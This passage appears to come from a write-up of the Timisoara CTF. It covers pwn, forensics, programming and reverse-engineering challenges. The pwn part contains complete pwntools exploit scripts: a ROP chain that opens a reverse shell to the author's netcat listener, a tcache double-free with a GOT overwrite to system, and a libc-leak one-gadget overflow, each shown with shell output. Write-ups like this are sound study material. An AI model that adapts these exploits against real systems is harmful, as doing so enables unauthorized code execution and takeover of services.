payload += p64(0x40)
payload += p64(0) * 2
payload += "A" * 0x28

payload += p64(pop_rcx)
payload += p64(bss)

payload += p64(pop_rdx)
payload += p64(0x6000)
payload += "A" * 0x28

payload += p64(protect)
payload += p64(bss + len(payload) + 0x10) 
payload += "\x90" * 0x100
payload += shellcode

log.info("payload : " + str(len(payload)))

r.recvuntil("payload: ")
pause()
r.sendline(payload)

r.interactive()
```

The environment setting method is as follows.

```
0. Leave the port open on my server.
1. start exploit!
```

`set port`

```
root@8055cfbd987a:~# nc -lvp 1234
listening on [any] 1234 ...
```

`start exploit`

```
juntae@ubuntu:~/ctf/timisoara/rop-me-baby$ python ex.py
```

`Client`

```
juntae@ubuntu:~/ctf/timisoara/rop-me-baby$ p ex.py 
[+] Opening connection to 89.38.208.147 on port 2025: Done
[*] ntdll : 0x7ffd02630000
[*] kernel32 : 0x7ffd01a00000
[*] bss : 0x4de040
[*] pop_rcx : 0x40c620
[*] pop_rdx : 0x401095
[*] pop_r8  : 0x4960b3
[*] pop_r9  : 0x4a4a14
[*] payload : 1228
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ 
[*] Interrupted
```

`server`

```bash
root@8055cfbd987a:~# nc -lvp 1234
listening on [any] 1234 ...
89.38.208.147: inverse host lookup failed: Unknown host
connect to [172.17.0.6] from (UNKNOWN) [89.38.208.147] 58731
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\RopME\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32BC-80DB

 Directory of C:\Users\RopME\Desktop

09/13/2019  12:21 PM    <DIR>          .
09/13/2019  12:21 PM    <DIR>          ..
09/13/2019  12:22 PM                29 chall.bat
09/13/2019  11:31 AM                28 flag.txt.txt
09/13/2019  12:53 PM           902,144 rop_me_baby.exe
09/13/2019  12:03 PM    <DIR>          socat_not_working
               3 File(s)        902,201 bytes
               3 Dir(s)  47,296,638,976 bytes free

C:\Users\RopME\Desktop>type flag.txt.txt
type flag.txt.txt
TIMCTF{Yeah_Y34h_ropME_b4by}
```

**FLAG : `TIMCTF{Yeah_Y34h_ropME_b4by}`**

<br />

## Team Manager (300pts)

> I found the team manager service used for Timisoara CTF. Do you think it is secure?
>
> nc 89.38.208.144 11114

```c
case 2u:
  printf("Enter player id (1-4) ");
  fflush(_bss_start);
  scanf("%d", &id);
  if ( id > 0 && id <= 4 )
  {
    if ( players[id] )
      free(players[id]);
  }
```
Do not check the Double Free bug here.

So, I can use `tchace dup`.

So I assigned the address of the GOT side to the players global variable.

```c
case 3u:
  printf("Enter player id (1-4) ");
  fflush(_bss_start);
  scanf("%d", &id);
  if ( id > 0 && id <= 4 )
  {
    if ( players[id] )
    {
      getchar();
      printf("Player's name: ");
      fflush(_bss_start);
      gets((players[id] + 6));
      printf("Player's skill at reversing and exploitation: ");
      fflush(_bss_start);
      scanf("%d", players[id]);
      printf("Player's skill at web exploit: ");
      fflush(_bss_start);
      scanf("%d", players[id] + 2);
      printf("Player's skill at crypto: ");
      fflush(_bss_start);
      scanf("%d", players[id] + 1);
      printf("Player's skill at forensics: ");
      fflush(_bss_start);
      scanf("%d", players[id] + 3);
      printf("Extra note/comment: ");
      fflush(_bss_start);
      getchar();
      gets(*(players[id] + 2));
      puts("\n");
    }
```

In this part, a heap overflow occurs.

So you can fill the got section with whatever you want.

### Exploit

As you debug, you will see that you pass the address 0x602090 as the argument to the free function.

Therefore, we cover the address of system function in GOT of free function.

Then enter the string "/bin/sh" at 0x602090.

Then run the free function to capture the shell.

```python
from pwn import *

#context.log_level = "debug"

e = ELF("./timctf_manager")
libc = ELF("./libc-2.27.so")
r = remote("89.38.208.144",11114)
#r = process("./timctf_manager")

def add(index,name,rev,web,crypto,forensic,comment):
	r.sendline("1")
	r.sendlineafter("(1-4) ",str(index))
	r.sendlineafter(": ",name)
	r.sendlineafter(": ",str(rev))
	r.sendlineafter(": ",str(web))
	r.sendlineafter(": ",str(crypto))
	r.sendlineafter(": ",str(forensic))
	r.sendlineafter(": ",comment)

def remove(index):
	r.sendline("2")
	r.sendlineafter("(1-4) ",str(index))

def edit(index,name,rev,web,crypto,forensic,comment):
	r.sendline("3")
	r.sendlineafter("(1-4) ",str(index))
	r.sendlineafter(": ",name)
	r.sendlineafter(": ",str(rev))
	r.sendlineafter(": ",str(web))
	r.sendlineafter(": ",str(crypto))
	r.sendlineafter(": ",str(forensic))
	r.sendlineafter(": ",comment)

def player(index):
	r.sendline("4")
	r.sendlineafter("(1-4) ",str(index))

players = 0x6020a0
got = e.got["free"]
log.info("got : " + hex(got))

# input : index,name,rev,web,crypto,forensic,comment

add(1,"\x00","+","+","+","+","AAAA")

remove(1)
remove(1)

add(2,"\x00",(players+0x8)-0x18,"+","+","+","BBBB")

add(3,"AAAA","+","+","+","+","CCCC")
add(4,p32(got-0x20),"+","+","+","+","DDDD")

player(1)

for i in range(0,1):
	r.recvuntil("\x7f")

leak = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00")
libc_base = leak - libc.symbols["free"] #0x408750
system = libc_base + libc.symbols["system"]
log.info("leak : " + hex(leak)) #600
log.info("libc_base : " + hex(libc_base))

payload = ""
payload += p64(0)
payload += p64(libc_base + libc.symbols["system"]) #free@got
payload += p64(libc_base + libc.symbols["putchar"])
payload += p64(libc_base + libc.symbols["puts"])
payload += p64(0)
payload += p64(libc_base + libc.symbols["printf"])
payload += p64(libc_base + libc.symbols["getchar"])
payload += p64(libc_base + libc.symbols["gets"])
payload += p64(libc_base + libc.symbols["malloc"])
payload += p64(libc_base + libc.symbols["fflush"])
payload += p64(libc_base + libc.symbols["scanf"])
payload += p64(libc_base + libc.symbols["fwrite"])
payload += p64(0) * 2
payload += p64(libc_base + 0x3ec760)
payload += p64(0)
payload += "/bin/sh\x00" #0x602090

pause()
edit(1,payload,"+","+","+","+","B")

#remove(4)

r.interactive()
```

```bash
juntae@ubuntu:~/ctf/timisoara/manager$ p ex.py 
[*] '/home/juntae/ctf/timisoara/manager/timctf_manager'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/juntae/ctf/timisoara/manager/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 89.38.208.144 on port 11114: Done
[*] got : 0x602018
[*] leak : 0x7fca44592950
[*] libc_base : 0x7fca444fb000
[*] Paused (press any to continue)
[*] Switching to interactive mode


1: Add player
2: Remove player
3: Edit player
4: View player
5: View team
0: Exit
$ 2
Enter player id (1-4) $ 4
$ ls
flag.txt
start.sh
timctf_manager
$ cat flag.txt
TIMCTF{Heap_overfl0ws_are_really_B4D}$ 
[*] Interrupted
[*] Closed connection to 89.38.208.144 port 11114
```

**FLAG : `TIMCTF{Heap_overfl0ws_are_really_B4D}`**

<br />

## Flag manager service (400pts)

> Our spies found this flag manager service running on the ctf server. It needs a password tho, but I am sure you can handle it.
>
> nc 89.38.208.144 11115 - back online

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char buf; // [rsp+0h] [rbp-90h]
  char format; // [rsp+40h] [rbp-50h]
  int fd; // [rsp+8Ch] [rbp-4h]

  strcpy(file, "flag.txt");
  filesize = 64;
  printf("Enter your name: ", argv, envp);
  fflush(stdout);
  gets(&format);
  printf("Hello, ");
  printf(&format);
  printf("\nEnter password please: ");
  fflush(stdout);
  gets(pass);
  fd = open(file, 0);
  if ( fd == -1 )
  {
    puts("Unable to open file!\n");
    fflush(stdout);
    result = 0;
  }
  else
  {
    read(fd, &buf, filesize);
    if ( !strcmp(pass, good_pass) )
      printf("Here is your flag, %s\n", &buf);
    else
      puts("NOOOOOOOOO!\n");
    fflush(stdout);
    result = 0;
  }
  return result;
}
```

Buffer Overflow and Format String Bugs Occur.

So, I can catch `RIP`.

Then, do `ROP` ( bypass `DEP`) can get shell.

### Exploit

`oneshot gadget`

```python
from pwn import *

#context.log_level = "debug"

e = ELF("./flag_manager01")
libc = e.libc

r = remote("89.38.208.144",11115)
#r = process("./flag_manager01")

pr = 0x4008a3

payload = ""
payload += "A" * 0x58
payload += p64(pr)
payload += p64(e.got["puts"])
payload += p64(e.plt["puts"])

payload += p64(e.symbols["main"])

r.sendlineafter("name: ",payload)
r.sendlineafter("please: ","1234")

libc_base = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00") - libc.symbols["puts"]
oneshot = libc_base + 0x10a38c
log.info("libc_base : " + hex(libc_base))

payload = ""
payload += "A" * 0x58
payload += p64(oneshot)

r.sendlineafter("name: ",payload)
r.sendlineafter("please: ","1234")

r.interactive()
```

```bash
juntae@ubuntu:~/ctf/timisoara/flag$ c
juntae@ubuntu:~/ctf/timisoara/flag$ p ex.py 
[*] '/home/juntae/ctf/timisoara/flag/flag_manager01'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 89.38.208.144 on port 11115: Done
[*] libc_base : 0x7ff5c611e000
[*] Switching to interactive mode
NOOOOOOOOO!

$ ls
fddup.so
flag_manager_nohook
flag.txt
start.sh
$ cat flag.txt
TIMCTF{d3v_fd_i5_sn3aky_backd00r}$ 
[*] Interrupted
[*] Closed connection to 89.38.208.144 port 11115
```

**FLAG : `TIMCTF{d3v_fd_i5_sn3aky_backd00r}`**

<br />

# Forensics

## Deleted file (100pts)

> Help! I accidentally deleted a photo! Can you recover it for me please?
>
> http://timisoaractf.ro/10MB.img
>
> Non-standard flag format

![](https://user-images.githubusercontent.com/32904385/65013863-ba26d500-d957-11e9-9ed5-42f93a943fb0.png)

just extract file or another solution is mount this image and show directory. PNG was hiding.

**FLAG : `flag{I_s33_the_uns33n}`**

<br />

## Strange image (100pts)

> I received this "image" in my mailbox today, but I can not open it, as if it was corrupted or something. Can you fix it and tell me if it has any hidden meaning?
>
> Note: if you think you "fixed" it and it does not open, try using a few different photo viewers.
>
> **Hint!** When you 'fix' your image make sure you try multiple photo viewers as some might not want to display it

```python
f = open('john.png','rb')
data = f.read()
f.close()
go = ""
for i in range(len(data)):
	go += chr(ord(data[i])^122)
f = open('copy.png','wb')
f.write(go)
f.close()
```

file hex values are encrypted

![](https://user-images.githubusercontent.com/32904385/65089125-ec3b4400-d9f6-11e9-87d5-2f5e7a292494.png)

i use strings to get looks like flag - `HATZ-fL4G: WLPFWI~Eudy3bm3kqxoh$`

use caesar cipher to solve it

```python
enc = 'WLPFWI~Eudy3bm3kqxoh$'
print ''.join(chr(ord(enc[i]) - 3) for i in range(len(enc)))
```

**FLAG : `TIMCTF{Brav0_j0hnule!}`**

## Tri-color QR (200pts)

> I stumbled upon this strange QR code which seems to be in a new format. Can you help me decode it?

```python
"""
(pink yellow red - black or white, blue hyung green - white or black)
(pink blue red - black or white, yellow hyung green - white or black)
(pink blue hyung - black or white, yellow red green - black or white)
"""

"""
no color - TIMCTF{
green - Th1s_is_A
blue - _4_part_
extract - flag}
"""
# 0 0 0 - black
# 255 255 255 - white
# 0 0 255 - blue
# 255 0 255 - pink
# 255 255 0 - yellow
# 0 255 255 - hyung
# 255 0 0 - red
# 0 255 0 - green 
k = (0,0,0) # blakc
w = (255,255,255) # white
pink = (255,0,255)
blue = (0,0,255)
yellow = (255,255,0)
hyung = (0,255,255)
red = (255,0,0)
green = (0,255,0)
img = Image.open('tri-color.png')
img = img.convert('RGB')
img_pix = img.load()
r,g,b = img_pix[0,0]
#r,g,b = img.getpixel((i,j))
for i in range(img.width):
	for j in range(img.height):
		if img_pix[i,j] == pink:
			img_pix[i,j] = w
		elif img_pix[i,j] == blue:
			img_pix[i,j] = w
		elif img_pix[i,j] == yellow:
			img_pix[i,j] = k
		elif img_pix[i,j] == hyung:
			img_pix[i,j] = w
		elif img_pix[i,j] == red:
			img_pix[i,j] = k
		elif img_pix[i,j] == green:
			img_pix[i,j] = k
img.save('solve.png')
```

The flags come out divided. extract this qr image file too.

**FLAG : `TIMCTF{Th1s_is_A_4_part_flag}`**

<br />

## Entangled (300pts)

> Something isn't clear right here...
>
> http://timisoaractf.ro/Entangled.img

The .img file is given. if you file 

![](https://user-images.githubusercontent.com/32904385/65087313-205f3680-d9f0-11e9-9681-9b0edab595cc.png)

open `free_fortnite_H4CKZ_run_me`  with IDA and look at the graph view, there is a QR code. You can recognize it. and get password `Cool_pass02`

Now dncrypted flag.enc with openssl

`openssl aes-128-cbc -in flag.enc -out flag -d -k Cool_pass02`

we can get flag file. this file type is PNG. 

![](https://user-images.githubusercontent.com/32904385/65093536-fb6ec180-d9f7-11e9-9000-8709c0e68af9.png)

**FLAG : `TIMCTF{C0de_oR_DAT4_tHe_uLtImAtE_qUesti0n}`**

<br />

# Misc

## Read the rules (1pts) ![First to solve this challenge!](http://timisoaractf.ro/img/award_star_gold_3.png)

> Have you read them?

![](https://user-images.githubusercontent.com/32904385/65008061-0582b880-d943-11e9-8c5c-c767352af838.png)

flag in the Short description.

**FLAG : `TIMCTF{sometext}`**

<br />

# Programming

## Subset sum (200pts)

> You are given a number n and an array. Find those elements from the array that sum to the given number.
>
> Number of tests: 10
> Size of the array: 4 - 40 (+4 per level)
> Input data type: 64 bit unsigned ints
> Input formatting: 2 lines of text, a line containing n and a line containg the array.
> Output formatting: the size of the subset and the elements of the subset, separated by a space
> Time limit: 3s
>
> nc 89.38.208.143 22021

- I thought of using a Meet in the Middle.
- But I used Trick.

```python
from pwn import *

p = remote("89.38.208.143",22021)
for i in range(1,11):
	print p.recvuntil("/10\n"),
	n = int(p.recvline()[:-1])
	temp_arr = p.recvline()[:-1]
	exec("arr = ["+ temp_arr.replace(' ',',') +"]")
	length = len(arr)
	N= length
	S = n
	nums = arr
	answer = "1 "+str(n)
	print n
	print arr
	print answer,"\n\n"
	p.sendline(answer)
p.interactive()
```

```bash
circler@Circler:/mnt/c/Users/Circler/Documents/ctf/timisoara$ python last.py
[+] Opening connection to 89.38.208.143 on port 22021: Done
I will give you an array. Find me the elements that sum to the given number
Test #1/10
886292542176
[270855512863, 138184617995, 345953397248, 402154526933]
1 886292542176


OK!
Test #2/10
731715580623
[43163442928, 469954144345, 5435257261, 9766270480, 200043173538, 255981247529, 420300402547, 222761446148]
1 731715580623


OK!
Test #3/10
1597618745872
[543263880939, 116485754333, 548124400896, 376592401134, 206476763989, 402294544529, 116272110186, 45644102154, 458401125094, 421506943181, 167181589742, 406220537122]
1 1597618745872

.
.
.
.
.
.
.
.
.


OK!
Test #9/10
5254545483621
[62104530613, 437252304722, 541275299117, 497852959064, 407315398134, 83838706323, 282774611877, 393225375205, 201824291289, 398707071239, 101569864581, 450422715752, 147564550876, 104680243266, 232065113352, 244637968397, 224244269686, 260846266591, 223312260455, 137614733585, 191959188846, 433233526485, 85375601324, 8337955352, 153487987350, 499975959804, 510533362081, 384059199435, 415942691154, 179504015328, 22738282436, 299104817667, 184896416718, 480768435343, 111130351529, 415558208715]
1 5254545483621


OK!
Test #10/10
4973169628790
[43904986332, 139193993172, 98420770138, 384179899376, 437042565118, 290188720014, 398995810338, 446808123987, 416859717806, 107432594929, 307718414222, 249727113524, 340012438295, 118330651094, 513137938676, 383988188892, 211696119478, 276733672617, 451611819850, 190900507459, 387483424834, 487260229850, 297558816385, 67518231930, 339531703993, 327004473875, 309580380704, 410160297239, 9028428723, 542168055503, 157872352428, 123340279300, 380677124259, 150818592688, 363500356850, 98634320981, 124979100229, 91052683464, 135981929186, 335324640254]
1 4973169628790


[*] Switching to interactive mode
OK!
Congrats: TIMCTF{W3_like_t0_m33t_in_tHe_m1ddle}
[*] Got EOF while reading in interactive
$
[*] Closed connection to 89.38.208.143 port 22021
[*] Got EOF while sending in interactive
```

**FLAG : `FLAG : TIMCTF{W3_like_t0_m33t_in_tHe_m1ddle}	`**

<br />

## Linear recurrence (200pts) 

> You are given two numbers: N and k and a linear recurrence. The first N terms are given, along with their coefficients in this order: cn * an, cn - 1 * an - 1, ..., c1 * a1
>
> For example, consider the Fibonacci sequence: a3 = 1*a2 + 1 * a1, where a2 and a1 are both equal to 1. In this case the input will be 1 1 1 1
>
> For the string a4 = 3 * a3 + 5 * a2 + 7 * a1 with a3 = 2, a2 = 1 and a1 = 4 the input will look like 3 2 5 1 7 4
>
> Note that all strings start from index 1
> N < k < 100.000.000
> Number of tests: 10
> Size of the input: 2 - 4 (4 - 8 including coefficients)
> Input data type: 64 bit unsigned ints
> Input formatting: 2 lines of text, a line containing N,k and a line containg the sequence.
> Output formatting: the kth term modulo 666013
> Time limit: 1s
>
> nc 89.38.208.143 22022

- Just Coding
- I use C and Python
- Using C to solve
- Using Python to connect the NC server

```python
from pwn import *
coefficient = []
arr = []
temp_length = 0
p = remote("89.38.208.143", 22022)
second_p = process("array")
for _ in range(10):
	print p.recvline(),
	print p.recvline(),
	N,K = p.recvline().split(' ')
	N = int(N)
	K = int(K)
	exec("temp_arr = ["+p.recvline()[:-1].replace(' ',',')+"]")
	temp_length = len(temp_arr)/2
	coefficient = []
	arr = []
	for i in range(temp_length):
		coefficient.append(temp_arr[i*2])
		arr.append(temp_arr[i*2+1])	
	print "N=",N,": K=",K
	print temp_arr
	print "coefficient =",coefficient
	print "arr =",arr
	arr.reverse()
	second_p.sendline(str(arr)[1:-1].replace(',',''))
	second_p.sendline(str(coefficient)[1:-1].replace(',',''))
	second_p.sendline(str(K))
	A = second_p.recvline()
	print "answer=",A,"\n"
	p.sendline(A)
p.interactive()
```

```c
#include <stdio.h> 

typedef unsigned long long int ulli;

ulli data[100000001];
ulli arr[122];
ulli coefficient[1222];

int main(void){
    ulli a;
    // Test #1/10:
    for(int i=0;i<2;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<2;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 2; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2])%666013;
    }
    printf("%lld\n", data[a-1]);

    // Test #2/10:
    for(int i=0;i<2;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<2;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 2; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2])%666013;
    }
    printf("%lld\n", data[a-1]);

    // Test #3/10:
    for(int i=0;i<3;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<3;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 3; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3])%666013;
    }
    printf("%lld\n", data[a-1]);


    // Test #4/10:
    for(int i=0;i<3;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<3;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 3; i < a; ++i)
    {
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3])%666013;
    }
    printf("%lld\n", data[a-1]);


    // Test #5/10:
    for(int i=0;i<3;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<3;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 3; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3])%666013;
    }
    printf("%lld\n", data[a-1]);



    // Test #6/10:
    for(int i=0;i<4;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<4;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 4; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3] + coefficient[3]*data[i-4])%666013;
    }
    printf("%lld\n", data[a-1]);

    // Test #7/10:
    for(int i=0;i<4;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<4;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 4; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3] + coefficient[3]*data[i-4])%666013;
    }
    printf("%lld\n", data[a-1]);

    // Test #8/10:
    for(int i=0;i<4;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<4;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 4; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3] + coefficient[3]*data[i-4])%666013;
    }
    printf("%lld\n", data[a-1]);

    // Test #9/10:
    for(int i=0;i<4;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<4;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 4; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3] + coefficient[3]*data[i-4])%666013;
    }
    printf("%lld\n", data[a-1]);


    // Test #10/10:
    for(int i=0;i<4;++i){
        scanf("%lld",&data[i]);
    }
    for(int i=0;i<4;++i){
        scanf("%lld",&coefficient[i]);
    }
    scanf("%lld",&a);
    for (ulli i = 4; i < a; ++i){
    	data[i] = (coefficient[0] *data[i-1] + coefficient[1]*data[i-2] + coefficient[2]*data[i-3] + coefficient[3]*data[i-4])%666013;
    }
    printf("%lld\n", data[a-1]);

    return 0;
}
```

```bash
circler@Circler:/mnt/c/Users/Circler/Documents/ctf/timisoara/programming2$ g++ array.cpp -o array
circler@Circler:/mnt/c/Users/Circler/Documents/ctf/timisoara/programming2$ python payload.py
[+] Opening connection to 89.38.208.143 on port 22022: Done
[!] Could not find executable 'array' in $PATH, using './array' instead
[+] Starting local process './array': pid 150
I will give you N, the size of the recurrence, k, the term you need to compute and then the first N numbers with their coefficients in this order: cn * an, cn-1 * an-1...
Test #1/10:
N= 2 : K= 63501
[7, 8, 6, 4]
coefficient = [7, 6]
arr = [8, 4]
answer= 530525


OK!
Test #2/10:
N= 2 : K= 12599
[16, 18, 19, 24]
coefficient = [16, 19]
arr = [18, 24]
answer= 171579


OK!
Test #3/10:
N= 3 : K= 462548
[20, 11, 7, 37, 36, 32]
coefficient = [20, 7, 36]
arr = [11, 37, 32]
answer= 231605

.
.
.
.
.
.
.
.
.
.
.

OK!
Test #9/10:
N= 4 : K= 10031110
[96, 87, 85, 123, 24, 109, 23, 65]
coefficient = [96, 85, 24, 23]
arr = [87, 123, 109, 65]
answer= 156974


OK!
Test #10/10:
N= 4 : K= 14138374
[6, 116, 11, 5, 50, 32, 19, 63]
coefficient = [6, 11, 50, 19]
arr = [116, 5, 32, 63]
answer= 381958


[*] Switching to interactive mode
OK!
TIMCTF{Matrix_multiplication_OP_please_n3rf}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Process './array' stopped with exit code 0 (pid 150)
[*] Closed connection to 89.38.208.143 port 22022
```

**FLAG : `FLAG : TIMCTF{Matrix_multiplication_OP_please_n3rf}`**

<br />

# Reverse Engineering

## Baby Rev (50pts) ![](https://user-images.githubusercontent.com/32904385/65112649-5cf45780-da1b-11e9-8760-9a589017f9b7.png)

> This program asks me for the flag, but i don't know it!

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax

  printf("Enter password: ", argv, envp);
  fgets(password, 64, _bss_start);
  while ( 1 )
  {
    v3 = strlen(password);
    if ( isprint(password[v3 - 1]) )
      break;
    password[strlen(password) - 1] = 0;
  }
  if ( !strcmp(password, flag) )
    puts("Congratulations, that is correct!");
  else
    puts("NOOOOOOOOOOOOOOOO");
  return 0;
}
```

just check input with flag. string stored in flag is `TIMCTF{Wh0_know5_a5m_kn0ws_R3V}`

**FLAG : `TIMCTF{Wh0_know5_a5m_kn0ws_R3V}`**

<br />

## Easy Rev (75pts) ![](https://user-images.githubusercontent.com/32904385/65112572-156dcb80-da1b-11e9-8133-e348ea7ecc6b.png)

> Like the last one, but harder

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int i; // [rsp+Ch] [rbp-14h]

  printf("Enter password: ", argv, envp);
  scanf("%s", password);
  if ( strlen(password) <= 0x40 )
  {
    if ( strlen(password) > 7 )
    {
      for ( i = 0; i < strlen(password); ++i )
      {
        if ( password[i] > 96 && password[i] <= 122 )
          password[i] = (password[i] - 84) % 26 + 97;
      }
      if ( !strcmp(password, flag) )
        puts("Congratulations, that is correct!");
      else
        puts("NOOOOOOOOOOOOOOOO");
      result = 0;
    }
    else
    {
      puts("Error: password too short!");
      result = 0;
    }
  }
  else
  {
    puts("Error: password too long!");
    result = 0;
  }
  return result;
}
```

this challenge check the password. bruteforce brought us the right price.

```python
flag = ''
table = 'TIMCTF{ebgngrq13synt}'
for i in range(len(table)):
	if ord(table[i]) > 96 and ord(table[i]) <= 122:
		for j in range(96,123):
			if ord(table[i]) == (j - 84) % 26 + 97:
				flag += chr(j)
				break
	else:
		flag += table[i]
print flag
```

**FLAG : `TIMCTF{rotated13flag}`**

<br />

## Boz Packer (150pts)

> This executable is packed using the new and imporved BOZ technology. It features strong antidebug checks
>
> Required library: openssl - http://timisoaractf.ro/libcrypto-1_1-x64.dll

![](https://user-images.githubusercontent.com/32904385/65042993-06dcd100-d995-11e9-8fe0-8ad3024e7064.png)

![](https://user-images.githubusercontent.com/32904385/65042994-07756780-d995-11e9-9d07-c9128cbe97fb.png)

![](https://user-images.githubusercontent.com/32904385/65042996-080dfe00-d995-11e9-975b-d0047106d17a.png)

patch and find "Enter password: " string

decrypt all values stored in md5.

**FLAG : `TIMCTF{BOZ_as_s33n_in_ecsc_upx_chall}`**

<br />

## Math (150pts)

> This executable is doing MATH. Everyone hates that so it must be hard to reverse

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  unsigned __int8 v4; // [rsp+2h] [rbp-2Eh]
  char v5; // [rsp+3h] [rbp-2Dh]
  int v6; // [rsp+4h] [rbp-2Ch]
  int v7; // [rsp+8h] [rbp-28h]
  int i; // [rsp+Ch] [rbp-24h]
  signed int j; // [rsp+10h] [rbp-20h]
  signed int k; // [rsp+14h] [rbp-1Ch]
  signed int l; // [rsp+18h] [rbp-18h]
  int m; // [rsp+1Ch] [rbp-14h]

  printf("Enter password: ", argv, envp);
  scanf("%s", plaintext);
  if ( strlen(plaintext) <= 0x100 )
  {
    v7 = 0;
    v5 = 0;
    for ( i = 0; i < strlen(plaintext); i += 3 )
    {
      v6 = key ^ (plaintext[i + 2] | ((plaintext[i + 1] | (plaintext[i] << 8)) << 8));
      for ( j = 0; j <= 2; ++j )
      {
        if ( !plaintext[i + j] )
          v5 = 1;
      }
      for ( k = 3; k >= 0; --k )
      {
        v4 = 0;
        for ( l = 5; l >= 0; --l )
        {
          if ( v6 & (1 << (6 * k + l)) )
            v4 |= 1 << l;
        }
        if ( v4 )
        {
          ciphertext[v7] = base64[v4];
        }
        else if ( v5 )
        {
          ciphertext[v7] = 61;
        }
        else
        {
          ciphertext[v7] = 65;
        }
        ++v7;
      }
    }
    for ( m = 0; flag[m]; ++m )
    {
      if ( flag[m] != ciphertext[m] )
      {
        puts(no);
        return 0;
      }
    }
    puts(yes);
    result = 0;
  }
  else
  {
    puts("Error: password too long!");
    result = 0;
  }
  return result;
}
```

do reverse math

```python
import base64
import struct

cip = "jveimeqpofewqY3chceAr+G6tPqKiM27u/CLhcbX7MPv"
cip = base64.b64decode(cip)
key = 14335727
flag = ''
for i in range(0,len(cip),3):
	a = struct.unpack('<i',cip[i:i+3][::-1] + "\x00")[0] ^ key
	flag += hex(a)[2:].decode('hex')
print flag
```

i did Bruteforce attack three digits. I guess first word.

```python
# TIMCTF{I_s33_you_UnDeRsTaNd_x86}
import gdb
table = "_1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz}"
go_table = []
for n in table:
		for m in table:
			for b in table:
				go_table.append(n+m)

payload = 'TIMCTF{I_' # 3byte
for i in range(len(go_table)):
	gdb.execute('file math',to_string=True)
	gdb.execute('b*main+561',to_string=True) # 0x55555555494b
	gdb.execute('r <<< ' + '"' + payload + go_table[i] + '"',to_string=True)
	d = gdb.execute('x/s $rax',to_string=True).split(' ')[1].replace('\n','').replace('"','').replace('<ciphertext>:\t','')
	print(payload + go_table[i] + " : " + d)
	if d == "jveimeqpofewqY3chceAr+G6tPqKiM27u/CLhcb":
		print('FLAG' + ' : ' + payload + go_table[i])
		break
gdb.execute('q',to_string=True)
```

**FLAG : `TIMCTF{I_s33_you_UnDeRsTaNd_x86}`**

<br />

## Pipes (200pts)

> Description : Someone said this program likes to smoke. Alot. See what's inside

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  bool v4; // al
  unsigned __int8 buf; // [rsp+7h] [rbp-59h]
  int v6; // [rsp+8h] [rbp-58h]
  int j; // [rsp+Ch] [rbp-54h]
  int i; // [rsp+10h] [rbp-50h]
  __pid_t pid; // [rsp+14h] [rbp-4Ch]
  char *s1; // [rsp+18h] [rbp-48h]
  __int64 v11; // [rsp+20h] [rbp-40h]
  __int64 v12; // [rsp+28h] [rbp-38h]
  __int64 v13; // [rsp+30h] [rbp-30h]
  __int64 v14; // [rsp+38h] [rbp-28h]
  __int64 v15; // [rsp+40h] [rbp-20h]
